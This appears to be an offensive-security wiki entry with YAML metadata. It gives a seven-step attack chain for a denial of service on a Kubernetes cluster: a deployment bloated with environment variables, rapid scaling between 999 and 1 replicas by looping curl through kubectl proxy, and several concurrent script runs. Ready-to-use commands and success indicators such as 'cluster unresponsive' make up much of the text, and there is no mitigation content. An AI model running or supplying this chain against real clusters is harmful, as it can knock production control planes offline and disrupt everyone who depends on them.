---
id: ac-k8s-dos-large-deploy-scale
tags:
  - kubernetes
  - dos
  - resource-exhaustion
  - scaling
  - etcd
  - api-server
type: attack_chain
tools:
  - '[[tools/kubectl]]'
  - '[[tools/curl]]'
  - '[[tools/bash]]'
tactics:
  - '[[Impact]]'
verified: false
platforms:
  - Kubernetes
submitted: true
complexity: medium
created_at: '2023-10-01T00:00:00Z'
procedures:
  - '[[procedures/create-large-kubernetes-deployment-with-env-vars]]'
  - '[[procedures/prepare-kubernetes-scale-up-json]]'
  - '[[procedures/prepare-kubernetes-scale-down-json]]'
  - '[[procedures/create-kubernetes-scaling-script]]'
  - '[[procedures/start-kubectl-proxy]]'
  - '[[procedures/execute-kubernetes-scaling-script]]'
  - '[[procedures/observe-kubernetes-resource-exhaustion]]'
step_count: 7
techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
updated_at: '2025-12-14T17:26:30.605Z'
description: >-
  An authenticated user exploits uncontrolled resource consumption in Kubernetes
  by creating a deployment with excessive environment variables and rapidly
  scaling it up and down, causing API server and etcd exhaustion leading to
  cluster-wide DoS.
skill_level: intermediate
impact_level: high
validated: true
mitre_tactics:
  - '[[Impact]]'
mitre_techniques:
  - '[[Endpoint Denial of Service]]'
  - '[[OS Exhaustion Flood]]'
---
# Kubernetes DoS via Large Deployment and Rapid Scaling

Multi-stage attack chain demonstrating a complete DoS workflow in Kubernetes clusters by exploiting resource limits on deployments and scaling operations.

## Chain Metrics Dashboard

| Metric | Value |
|--------|-------|
| Chain Status | Unverified |
| Total Steps | 7 |
| Execution Time | ~5-10 minutes |
| Skill Level | Intermediate |
| Complexity | Medium |
| Impact Level | High |

## Attack Flow Visualization

```mermaid
graph LR
    A[Create Large Deployment] --> B[Prepare Scaling Files]
    B --> C[Start API Proxy]
    C --> D[Execute Rapid Scaling]
    D --> E[Observe DoS]

    style A fill:#e74c3c
    style B fill:#f39c12
    style C fill:#3498db
    style D fill:#e67e22
    style E fill:#e74c3c
```

## Prerequisites & Requirements

### Required Tools

- [[tools/kubectl]]
- [[tools/curl]]
- [[tools/bash]]

### Target Environment

- Kubernetes cluster (version vulnerable to uncontrolled env var limits, e.g., pre-1.20 without custom limits)
- Authenticated access to the cluster via kubeconfig
- Services: Kubernetes API Server, etcd
- Ports: 8001 (for proxy), standard Kubernetes API port (6443)

### Initial Access Requirements

- Valid user credentials with permissions to create deployments and scale them in a namespace (e.g., default)
- Local machine with kubectl configured
- Network access to the cluster API

## Detailed Attack Procedures

### Step 1: Create Large Deployment
procedure: [[procedures/create-large-kubernetes-deployment-with-env-vars]]

**Objective**: Deploy a resource-light pod configuration bloated with environment variables to maximize processing overhead in the API server and etcd.

**Instructions**: Prepare a YAML file with a deployment using a low-resource image like nginx, filled with numerous env vars (up to ~1MB size). Apply it using [[commands/kubectl-apply-deployment]]:

```bash
kubectl apply -f large-nginx-deployment.yaml
```

**Expected Output**: Deployment created successfully, with 1 initial replica running.

**Success Indicators**:
- Deployment status shows ready pods
- No immediate errors in kubectl get deployments

### Step 2: Prepare Scale Up File
procedure: [[procedures/prepare-kubernetes-scale-up-json]]

**Objective**: Create a JSON payload to scale the deployment to a high replica count (e.g., 999) for resource spike.

**Instructions**: Generate scale.json with the replicas specification using a text editor or echo command:

```bash
echo '{"spec":{"replicas":999}}' > scale.json
```

**Expected Output**: JSON file created with scale-up configuration.

**Success Indicators**:
- File contents verify replicas: 999
- Valid JSON syntax

### Step 3: Prepare Scale Down File
procedure: [[procedures/prepare-kubernetes-scale-down-json]]

**Objective**: Create a JSON payload to scale back to 1 replica, enabling repeated cycles.

**Instructions**: Generate scaledown.json similarly:

```bash
echo '{"spec":{"replicas":1}}' > scaledown.json
```

**Expected Output**: JSON file created with scale-down configuration.

**Success Indicators**:
- File contents verify replicas: 1
- Valid JSON syntax

### Step 4: Create Scaling Script
procedure: [[procedures/create-kubernetes-scaling-script]]

**Objective**: Automate repeated scale up/down operations via curl to the API for concurrency.

**Instructions**: Write run.sh with loops of curl commands using [[commands/curl-scale-up-deployment]] and [[commands/curl-scale-down-deployment]], e.g., 50 cycles:

```bash
for i in {1..50}; do
  curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scale.json
  curl -X PUT 127.0.0.1:8001/apis/apps/v1/namespaces/default/deployments/nginx/scale -H "Content-Type: application/json" -d @scaledown.json

done
```

**Expected Output**: Script file saved, ready for execution.

**Success Indicators**:
- Script syntax valid (bash -n run.sh passes)
- Contains expected curl loops

### Step 5: Start API Proxy
procedure: [[procedures/start-kubectl-proxy]]

**Objective**: Expose the Kubernetes API locally for unauthenticated curl access in the script.

**Instructions**: Run [[commands/kubectl-proxy-start]] in a terminal:

```bash
kubectl proxy
```

**Expected Output**: Proxy running on 127.0.0.1:8001, logs show "Starting to serve on 127.0.0.1:8001".

**Success Indicators**:
- curl http://127.0.0.1:8001/version returns API info
- No proxy errors

### Step 6: Execute Scaling Script
procedure: [[procedures/execute-kubernetes-scaling-script]]

**Objective**: Run the script multiple times concurrently to flood the API and etcd with processing requests.

**Instructions**: In separate terminals, execute [[commands/run-scaling-script]] repeatedly (e.g., 3-5 times):

```bash
./run.sh &
./run.sh &
./run.sh
```

**Expected Output**: Curl responses with 200/201 status for scales, but increasing delays and errors as resources exhaust.

**Success Indicators**:
- Multiple script instances running
- Initial scales succeed, then cluster lags

### Step 7: Observe Resource Exhaustion
procedure: [[procedures/observe-kubernetes-resource-exhaustion]]

**Objective**: Monitor and confirm DoS impact on the cluster control plane.

**Instructions**: Use kubectl top or system tools to watch CPU/memory on masters:

```bash
kubectl top nodes
watch -n 1 'kubectl get pods --all-namespaces'
```

**Expected Output**: CPU/memory spikes to 100% on API server/etcd, cluster unresponsive (timeouts on kubectl commands).

**Success Indicators**:
- Master nodes at max utilization
- API calls fail with timeouts
- Etcd unresponsive even after stopping scripts

## Attack Chain Summary

### Key Achievements

1. Successful creation of oversized deployment without limits
2. Rapid scaling cycles overwhelming API/etcd processing
3. Full cluster DoS, unrecoverable without restart on multi-master setups

## Technique & Tactic Coverage

### MITRE ATT&CK Techniques

- [[Endpoint Denial of Service]] Endpoint Denial of Service
- [[OS Exhaustion Flood]] OS Exhaustion Floods

### MITRE ATT&CK Tactics

- [[Impact]] Impact

---

*Last updated: 2023-10-01T00:00:00Z*
